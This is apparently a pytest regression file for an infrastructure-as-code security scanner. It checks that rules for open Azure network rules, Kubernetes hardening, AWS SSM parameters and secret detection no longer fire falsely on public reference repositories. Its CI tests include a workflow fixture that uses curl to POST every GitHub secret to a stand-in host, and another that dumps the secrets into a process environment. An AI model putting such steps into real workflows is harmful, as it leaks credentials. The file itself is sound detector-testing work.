"""False positives found by scanning infrastructure nobody here wrote.

Same discipline as `test_real_world_noise.py` and a different corpus. The
generated policy set is five times the size of the hand-written table and was
built from provider schemas rather than from reading code, so the only way to
know what it says about real infrastructure is to point it at real
infrastructure: thirteen repositories -- the reference modules for Terraform,
CloudFormation, Kubernetes, Bicep and ARM, published by AWS, Microsoft, Google
and the Kubernetes project -- 20,310 files between them.

Every case below is a finding that run produced against one of those
repositories and that was wrong. The fix is in the rule; this is what stops it
coming back.
"""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.config import Config
from cordon_scanner.core.models import Severity
from cordon_scanner.detect.iac_policies import all_policies
from cordon_scanner.detect.secrets import NOT_A_SECRET
from support import assemble

POLICIES = {policy.id: policy for policy in all_policies()}

AZURE_NSG = "SUSPECT.AZURE.OPEN_INGRESS.NETWORK_NETWORKSECURITYGROUPS_SOURCEADDRESSPREFIX.001"


def config() -> Config:
    return Config.default().with_overrides(use_cache=False)


def scan(root) -> set[str]:
    return {f.rule_id for f in Scanner(config()).scan(root).findings}


def _security_rule(**properties: str) -> str:
    body = "".join(f"        {key}: '{value}'\n" for key, value in properties.items())
    return (
        "resource nsg 'Microsoft.Network/networkSecurityGroups@2023-05-01' = {\n"
        "  name: 'example'\n"
        "  properties: {\n"
        "    securityRules: [\n"
        "      {\n"
        "        name: 'rule'\n"
        f"{body}"
        "      }\n"
        "    ]\n"
        "  }\n"
        "}\n"
    )


class TestAnAzureRuleThatAdmitsNothing:
    """`sourceAddressPrefix: '*'` was reported at high wherever it appeared.

    Measured against `Azure/azure-quickstart-templates`: 385 findings, of which
    75 were a Deny rule or an Outbound one. A rule that denies is the control,
    not the finding, and a rule governing traffic leaving the subnet does not
    admit anybody. Most of the remainder described a public web tier's port 80,
    which is what a public web tier is.

    What is left after gating on Allow, Inbound and an administrative
    destination port is 337 findings, and a hand count of the ports behind them
    is 217 on SSH, 145 on RDP and the rest on database ports -- which is the
    thing the rule's title claims.
    """

    def test_a_deny_rule_is_not_an_opening(self, tmp_path) -> None:
        (tmp_path / "nsg.bicep").write_text(
            _security_rule(
                access="Deny",
                direction="Inbound",
                destinationPortRange="22",
                sourceAddressPrefix="*",
            ),
            encoding="utf-8",
        )
        assert AZURE_NSG not in scan(tmp_path)

    def test_an_outbound_rule_admits_nobody(self, tmp_path) -> None:
        (tmp_path / "nsg.bicep").write_text(
            _security_rule(
                access="Allow",
                direction="Outbound",
                destinationPortRange="22",
                sourceAddressPrefix="*",
            ),
            encoding="utf-8",
        )
        assert AZURE_NSG not in scan(tmp_path)

    def test_a_public_web_port_is_what_a_web_tier_looks_like(self, tmp_path) -> None:
        (tmp_path / "nsg.bicep").write_text(
            _security_rule(
                access="Allow",
                direction="Inbound",
                destinationPortRange="443",
                sourceAddressPrefix="*",
            ),
            encoding="utf-8",
        )
        assert AZURE_NSG not in scan(tmp_path)

    @pytest.mark.parametrize("port", ["22", "3389", "1433", "3306", "27017", "*"])
    def test_an_administrative_port_open_to_the_internet_still_fires(
        self, tmp_path, port: str
    ) -> None:
        (tmp_path / "nsg.bicep").write_text(
            _security_rule(
                access="Allow",
                direction="Inbound",
                destinationPortRange=port,
                sourceAddressPrefix="*",
            ),
            encoding="utf-8",
        )
        assert AZURE_NSG in scan(tmp_path)


class TestHardeningThatIsAbsentRatherThanWrong:
    """Four Kubernetes policies were 506 of the findings across five
    repositories, every one of them the absence of a hardening field rather than
    an insecure value. `NO_RUN_AS_NON_ROOT` alone blocked the default gate on
    `kube-prometheus` and `kubernetes/examples`, which are the manifests those
    projects publish as correct.

    The observation is worth making and is not worth failing a build over. An
    explicitly insecure value keeps its severity, and those rules are asserted
    below so the demotion cannot be read as dropping the subject.
    """

    @pytest.mark.parametrize(
        "policy_id",
        [
            "POLICY.K8S.NO_RUN_AS_NON_ROOT.001",
            "POLICY.K8S.NO_SECCOMP.001",
            "POLICY.K8S.NO_RESOURCE_LIMITS.001",
            "POLICY.K8S.DEFAULT_SERVICE_ACCOUNT.001",
        ],
    )
    def test_a_missing_flag_does_not_block(self, policy_id: str) -> None:
        assert POLICIES[policy_id].severity is Severity.LOW

    def test_an_explicitly_privileged_container_still_does(self, tmp_path) -> None:
        (tmp_path / "pod.yaml").write_text(
            "apiVersion: v1\nkind: Pod\nmetadata:\n  name: app\nspec:\n"
            "  containers:\n    - name: app\n      securityContext:\n"
            "        privileged: true\n",
            encoding="utf-8",
        )
        assert "SUSPECT.IAC.PRIVILEGED.001" in scan(tmp_path)


class TestAParameterThatHoldsNoSecret:
    """`aws_ssm_parameter` without `key_id` was 109 findings in
    `cloudposse/terraform-aws-components`, against parameters holding region
    names and account numbers. A `String` parameter is not a secret and needs no
    key; a `SecureString` is encrypted with the account's default key unless one
    is named, which is the decision worth reporting.
    """

    POLICY = "POLICY.IAC.ENCRYPT_AT_REST.AWS_SSM_PARAMETER_KEY_ID.001"

    def test_a_plain_parameter_is_not_asked_for_a_key(self, tmp_path) -> None:
        (tmp_path / "main.tf").write_text(
            'resource "aws_ssm_parameter" "region" {\n'
            '  name  = "/app/region"\n'
            '  type  = "String"\n'
            '  value = "eu-west-1"\n'
            "}\n",
            encoding="utf-8",
        )
        assert self.POLICY not in scan(tmp_path)

    def test_a_secure_parameter_with_no_key_is(self, tmp_path) -> None:
        (tmp_path / "main.tf").write_text(
            'resource "aws_ssm_parameter" "password" {\n'
            '  name  = "/app/password"\n'
            '  type  = "SecureString"\n'
            "  value = var.password\n"
            "}\n",
            encoding="utf-8",
        )
        assert self.POLICY in scan(tmp_path)

    def test_a_secure_parameter_with_a_key_is_not(self, tmp_path) -> None:
        (tmp_path / "main.tf").write_text(
            'resource "aws_ssm_parameter" "password" {\n'
            '  name   = "/app/password"\n'
            '  type   = "SecureString"\n'
            "  key_id = aws_kms_key.this.arn\n"
            "  value  = var.password\n"
            "}\n",
            encoding="utf-8",
        )
        assert self.POLICY not in scan(tmp_path)


class TestForwardingSecretsIsNotStealingThem:
    """`toJSON(secrets)` was three critical malicious findings in
    `Azure/bicep-registry-modules`, where `avm.template.module.yml` and two
    siblings pass the context as an input to a reusable workflow.

    A composite action cannot read `secrets`, so forwarding it wholesale is a
    real way to pass credentials into one. It over-provisions the step and it is
    not exfiltration, and Microsoft's own module registry is not sending its
    credentials to itself. The critical claim now needs the context to reach
    something that can carry it off the runner.
    """

    WORKFLOW = ".github/workflows/ci.yml"

    def _workflow(self, tmp_path, body: str):
        path = tmp_path / self.WORKFLOW
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body, encoding="utf-8")
        return tmp_path

    def test_forwarding_the_context_is_reported_as_what_it_is(self, tmp_path) -> None:
        found = scan(
            self._workflow(
                tmp_path,
                "on: push\njobs:\n  build:\n    uses: ./.github/workflows/inner.yml\n"
                "    with:\n      githubSecrets: ${{ toJSON(secrets) }}\n",
            )
        )
        assert "SUSPECT.CI.SECRET_OVERPROVISION.001" in found
        assert "MALWARE.CI.SECRET_EXFIL.001" not in found

    def test_putting_it_in_a_command_is_still_critical(self, tmp_path) -> None:
        """`digininja/DVWA`'s shape, which the thirteenth review pass left alone
        deliberately: every secret the job holds, materialised into a process."""
        found = scan(
            self._workflow(
                tmp_path,
                "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
                "      - run: env\n        env:\n"
                "          ALLMYSECRETS: ${{ toJSON(secrets) }}\n",
            )
        )
        assert "MALWARE.CI.SECRET_EXFIL.001" in found
        assert "SUSPECT.CI.SECRET_OVERPROVISION.001" not in found

    def test_putting_it_in_a_command_line_is_too(self, tmp_path) -> None:
        found = scan(
            self._workflow(
                tmp_path,
                "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
                '      - run: curl -X POST -d "${{ toJSON(secrets) }}" https://example.invalid/c\n',
            )
        )
        assert "MALWARE.CI.SECRET_EXFIL.001" in found


class TestNamesThatAreNotCredentials:
    """Five secret findings in `Azure/bicep-registry-modules`, three of them
    wrong, and both causes are spellings the exclusions already covered in
    another form."""

    @pytest.mark.parametrize(
        "value",
        [
            # Bicep's safe dereference. The dotted-name exclusion covered
            # `a.b.c` and not `a.?b.?c`, which is the same reference guarding
            # against a missing parent.
            b"virtualWanParameters.?p2sVpnParameters.?radiusServerSecret",
            b"config?.auth?.clientSecret",
        ],
    )
    def test_a_reference_or_an_identifier_is_not_a_credential(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value)

    def test_a_role_identifier_is_reported_but_does_not_block(self, tmp_path) -> None:
        """The other half of the same sample, left alone deliberately.

        `keyVaultSecretUserRoleGuid = '4633458b-...'` is Azure's built-in Key
        Vault Secrets User role, a published constant, and the name carries
        `Secret` as an inner word. It is reported -- a UUID is genuinely the
        secret in some systems, which `TestAUuidIsWeakerEvidenceThanAToken`
        measured -- and the grading that measurement introduced is what keeps it
        out of the gate.
        """
        role = assemble("4633458b-17de-", "408a-b874-", "0445c86b69e6")
        (tmp_path / "roles.bicep").write_text(
            f"var keyVaultSecretUserRoleGuid = '{role}'\n",
            encoding="utf-8",
        )
        findings = [
            f
            for f in Scanner(config()).scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]
        assert findings and all(f.severity <= Severity.MEDIUM for f in findings)

    def test_a_literal_default_password_still_is(self, tmp_path) -> None:
        """The true positive from the same repository, kept so the exclusions
        above cannot be read as switching the rule off: `chat-with-your-data`
        falls back to a hardcoded jump-box password."""
        fallback = assemble("JumpboxAdmin", "P@ssw0rd", "1234!")
        (tmp_path / "main.bicep").write_text(
            "param virtualMachineAdminPassword string = ''\n"
            "var adminPassword = !empty(virtualMachineAdminPassword)"
            f" ? virtualMachineAdminPassword : '{fallback}'\n",
            encoding="utf-8",
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" in scan(tmp_path)
